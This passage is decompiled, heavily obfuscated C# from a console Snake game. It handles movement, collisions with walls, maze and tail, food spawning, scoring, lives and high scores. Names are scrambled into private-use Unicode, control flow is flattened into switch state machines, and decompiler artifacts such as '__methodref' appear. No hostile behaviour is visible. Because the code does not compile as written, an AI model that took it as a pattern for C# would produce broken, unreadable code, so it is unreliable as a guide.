                    case 61:
                      Thread.Sleep(millisecondsTimeout);
                      num6 = 119;
                      continue;
                    case 62:
                      num3 = num5;
                      num6 = 10;
                      continue;
                    case 63:
                      checked { num1 += millisecondsTimeout; }
                      num6 = 13;
                      continue;
                    case 64:
                      num6 = 14;
                      continue;
                    case 65:
                      goto label_16;
                    default:
                      goto label_5;
                  }
                }
label_16:
                int num7 = 0;
                goto label_18;
label_17:
                num7 = 1;
label_18:
                if (num7 == 0)
                {
                  num4 = 0;
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9E();
                }
                if ((num1 < num5 ? 1 : 0) == 0)
                {
                  num1 = 0;
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Move();
                  if (((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].X == 0 ? 1 : 0) == 0 && \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].X != checked (Console.WindowWidth - 1) ? 1 : 0) == 0)
                  {
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.HitWall;
                    goto label_70;
                  }
                  else if (((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Y == 0 ? 1 : 0) == 0 && \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Y != checked (Console.WindowHeight - 1) ? 1 : 0) == 0)
                  {
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.HitWall;
                    goto label_70;
                  }
                  else if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.get_IntersectsWith(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0]) ? 1 : 0) == 0)
                  {
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.HitMaze;
                    goto label_70;
                  }
                  else
                  {
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.eraseSegment.Enqueue((Segment) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count - 1)].Clone());
                    int num8 = checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count - 1);
                    int index = 1;
                    if (index != 0)
                      goto label_38;
label_28:
                    if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].IntersectsWith(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index]) ? 1 : 0) == 0)
                    {
                      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.EatOwnTail;
                      goto label_70;
                    }
                    else
                    {
label_31:
                      int num9 = 6;
                      while (true)
                      {
                        switch (num9 ^ 56)
                        {
                          case 61:
                            // ISSUE: method reference
                            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED90);
                            num9 = 5;
                            continue;
                          case 62:
                            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].X = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[checked (index - 1)].LastX;
                            num9 = 121;
                            continue;
                          case 63:
                            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].Y = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[checked (index - 1)].LastY;
                            num9 = 120;
                            continue;
                          case 64:
                            num9 = 122;
                            continue;
                          case 65:
                            num9 = 7;
                            continue;
                          case 66:
                            goto label_37;
                          default:
                            goto label_31;
                        }
                      }
label_37:
                      checked { ++index; }
                    }
label_38:
                    if (index > num8)
                    {
                      if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food == null ? 1 : 0) == 0)
                      {
                        if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Item.IntersectsWith(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0]) ? 1 : 0) == 0)
                        {
                          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED96(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Level);
                          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses.Add(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Clone());
                          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9A();
                          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food = (FoodItem) null;
                          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9B();
                        }
                        else if ((!(TimeSpan.FromTicks(DateAndTime.Now.Ticks) - \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.CreatedOn > \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.foodItemLifeSpan) ? 1 : 0) == 0)
                        {
                          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9A();
                          if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count <= \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Level ? 1 : 0) != 0)
                          {
                            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.Hunger;
                            goto label_70;
                          }
                          else
                          {
                            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food = (FoodItem) null;
                            if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count >= 2 ? 1 : 0) == 0)
                            {
                              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.Hunger;
                              goto label_70;
                            }
                          }
                        }
                      }
                    }
                    else
                      goto label_28;
                  }
                }
                if ((num2 < maxValue ? 1 : 0) == 0)
                {
                  num2 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.rnd.Next(0, maxValue);
                  if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food != null ? 1 : 0) == 0)
                  {
                    int x;
                    int y;
                    Segment s;
                    do
                    {
                      x = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.rnd.Next(2, checked (Console.WindowWidth - 2));
                      y = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.rnd.Next(2, checked (Console.WindowHeight - 2));
                      s = new Segment(x, y, Segment.Directions.Same, ConsoleColor.White);
                      if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.get_IntersectsWith(s) ? 1 : 0) == 0)
                      {
                        s = (Segment) null;
                      }
                      else
                      {
                        int num10 = checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count - 1);
                        int index = 0;
                        if (index == 0)
                          goto label_57;
label_54:
                        if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].IntersectsWith(s) ? 1 : 0) == 0)
                        {
                          s = (Segment) null;
                          goto label_58;
                        }
                        else
                          checked { ++index; }
label_57:
                        if (index <= num10)
                          goto label_54;
label_58:;
                      }
                    }
                    while ((s == null ? 1 : 0) != 0);
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food = new FoodItem(x, y, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.rnd.Next(1, (!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode ? 0 : 1) != 0 ? 12 : 6));
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.foodItemLifeSpan = TimeSpan.FromSeconds((double) checked (20 - \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Level) + (double) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Index / 2.0 + (double) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count / 10.0);
                    \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.showingTimer = true;
                  }
                }
              }
              while ((!Console.KeyAvailable ? 1 : 0) != 0);
              switch (Console.ReadKey(true).Key)
              {
                case ConsoleKey.Escape:
                  goto label_68;
                case ConsoleKey.LeftArrow:
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Direction = Segment.Directions.Left;
                  break;
                case ConsoleKey.UpArrow:
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Direction = Segment.Directions.Up;
                  break;
                case ConsoleKey.RightArrow:
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Direction = Segment.Directions.Right;
                  break;
                case ConsoleKey.DownArrow:
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[0].Direction = Segment.Directions.Down;
                  break;
              }
            }
label_68:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.UserQuit;
label_70:
            if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason != \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.UserQuit ? 1 : 0) != 0)
            {
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED97(0);
              checked { --\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lives; }
            }
            else
              goto label_73;
          }
          while ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lives != 0 ? 1 : 0) != 0);
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2();
label_73:;
        }
        while ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason == \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.UserQuit ? 1 : 0) != 0);
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA3();
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED97(2);
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED91();
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED98();
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA3();
      }
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED96(
      int _param0)
    {
      if ((Conversion.Int((double) checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score + _param0) / 100.0) <= Conversion.Int((double) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score / 100.0) ? 1 : 0) == 0)
      {
        checked { ++\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lives; }
label_8:
        int num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(34);
        int num2 = -10;
        while (true)
        {
          switch ((num2 ^ 73) + 68)
          {
            case 0:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8D);
              num2 = -11;
              continue;
            case 1:
              switch (num1 + 73)
              {
                case 0:
                  num1 = -2;
                  goto label_2;
                case 1:
                  \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2();
                  num1 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(35);
                  goto label_2;
                case 2:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED93);
                  num1 = -3;
                  goto label_2;
                case 3:
                  goto label_12;
                default:
                  num2 = -9;
                  continue;
              }
            case 2:
              goto label_8;
            case 3:
label_2:
              num1 ^= 68;
              break;
          }
          // ISSUE: reference to a compiler-generated method
          num2 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA90.\uE152\uE14D\uE4B1\uE4CF\uEFA5\uEAA8\uF7D2\uF85C\uF37D\uF074\uF5CA\uE496(19);
        }
      }
label_12:
      checked { \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score += _param0; }
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED97(
      int _param0)
    {
label_5:
      int num1 = PackOfCards.\uE952\uEF95\uEFCD\uEA81\uF020\uE4AB\uE598\uF418\uE1FC\uE91E\uF085\uF208(65);
      int num2 = 7;
      while (true)
      {
        switch (num2 ^ 67)
        {
          case 65:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8C);
            num2 = 2;
            continue;
          case 66:
            goto label_5;
          case 67:
            int index;
            int num3;
            int num4;
            switch (num1 + 68)
            {
              case 0:
label_8:
                Thread.Sleep(50);
                num1 = (int) sbyte.MinValue;
                goto label_1;
              case 1:
                if (index != 0)
                {
                  num1 = -7;
                  goto label_1;
                }
                else
                  goto label_31;
              case 2:
                if (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].Y < checked (Console.WindowHeight - 1))
                {
                  num1 = -126;
                  goto label_1;
                }
                else
                  break;
              case 3:
                if (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].X < checked (Console.WindowWidth - 1))
                {
                  num1 = -127;
                  goto label_1;
                }
                else
                  break;
              case 4:
                index = 0;
                num1 = -8;
                goto label_1;
              case 5:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA1);
                num1 = -124;
                goto label_1;
              case 6:
                num3 = checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count - 1);
                num1 = -123;
                goto label_1;
              case 7:
                if (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].X > 0)
                {
                  num1 = -6;
                  goto label_1;
                }
                else
                  break;
              case 8:
                if (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].Y > 0)
                {
                  num1 = -5;
                  goto label_1;
                }
                else
                  break;
              case 9:
                num1 = PackOfCards.\uE952\uEF95\uEFCD\uEA81\uF020\uE4AB\uE598\uF418\uE1FC\uE91E\uF085\uF208(70);
                goto label_1;
              case 10:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = true;
                num1 = -121;
                goto label_1;
              case 11:
                num4 = !\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.get_IntersectsWith(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index]) ? 1 : 0;
                goto label_26;
              default:
                num2 = 1;
                continue;
            }
            num4 = 0;
label_26:
            if ((num4 == 0 ? 1 : 0) == 0)
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake[index].Draw(' ');
            if ((_param0 <= 0 ? 1 : 0) == 0)
            {
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED96(_param0);
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA1(true);
            }
            checked { ++index; }
label_31:
            if (index <= num3)
              goto label_8;
            else
              goto label_32;
          case 68:
label_1:
            num1 ^= 69;
            break;
        }
        num2 = 0;
      }
label_32:
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = false;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED98()
    {
label_2:
      int num1 = PackOfCards.\uE952\uEF95\uEFCD\uEA81\uF020\uE4AB\uE598\uF418\uE1FC\uE91E\uF085\uF208(67);
      int index;
      while (true)
      {
        bool flag;
        int num2;
        int num3;
        switch ((num1 ^ 69) + 66)
        {
          case 0:
            if (flag)
            {
              num1 = (int) sbyte.MinValue;
              continue;
            }
            num3 = 1;
            break;
          case 1:
            num2 = checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.highScores.Count - 1);
            num1 = -123;
            continue;
          case 2:
            index = 0;
            num1 = -122;
            continue;
          case 3:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = true;
            num1 = -6;
            continue;
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F);
            num1 = -121;
            continue;
          case 5:
            if (index != 0)
            {
              num1 = PackOfCards.\uE952\uEF95\uEFCD\uEA81\uF020\uE4AB\uE598\uF418\uE1FC\uE91E\uF085\uF208(72);
              continue;
            }
            goto label_25;
          case 6:
label_11:
            flag = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score > \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.highScores[index].\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBC;
            num1 = -5;
            continue;
          case 7:
            num3 = 0;
            break;
          default:
            goto label_2;
        }
        if (num3 != 0)
          checked { ++index; }
        else
          break;
label_25:
        if (index <= num2)
          goto label_11;
        else
          goto label_26;
      }
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1 obj = new \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED99(), \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Name, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Index, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode);
label_17:
